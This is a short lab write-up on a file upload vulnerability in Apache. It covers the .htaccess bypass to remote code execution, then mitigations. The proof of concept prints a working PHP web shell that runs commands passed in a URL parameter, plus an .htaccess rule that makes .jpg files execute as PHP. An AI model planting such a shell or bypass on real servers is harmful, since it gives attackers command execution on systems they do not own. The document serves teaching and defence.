## Overview

This lab demonstrates a **file upload vulnerability** in a simulated web application. By exploiting weak validation, we are able to achieve **Remote Code Execution (RCE)** on an Apache server using an `.htaccess` bypass technique.

---

## Objective

- Understand file upload vulnerabilities  
- Learn how `.htaccess` can be abused to execute uploaded files  
- Practice safe exploitation in a controlled environment  

---

## Vulnerability Description

File upload functionality is often a critical entry point for attackers. In this lab:

- The web application **fails to properly validate file types**  
- Apache `.htaccess` files are **not restricted**, allowing uploaded files to execute as PHP scripts  
- This allows attackers to execute arbitrary code on the server  

---

## Exploitation Steps

1. Upload a **malicious PHP file** disguised as an image  
2. Upload an **`.htaccess` file** to bypass content-type restrictions  
3. Access the uploaded PHP file via the browser  
4. Achieve **remote code execution**  

---

## Proof of Concept

```php
<?php
// Simple PHP web shell example
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
````

* Upload the above PHP shell as `shell.php`
* Upload an `.htaccess` with content:

```apache
AddType application/x-httpd-php .jpg
```

* Access `shell.php` via browser and test commands:

```
http://target.com/uploads/shell.php?cmd=whoami
```

---

## Mitigation

* **Validate uploaded files**: restrict by MIME type and file extension
* **Rename uploaded files** and store outside web root
* **Disable `.htaccess` overrides** where not required
* **Use least privilege permissions** for upload directories
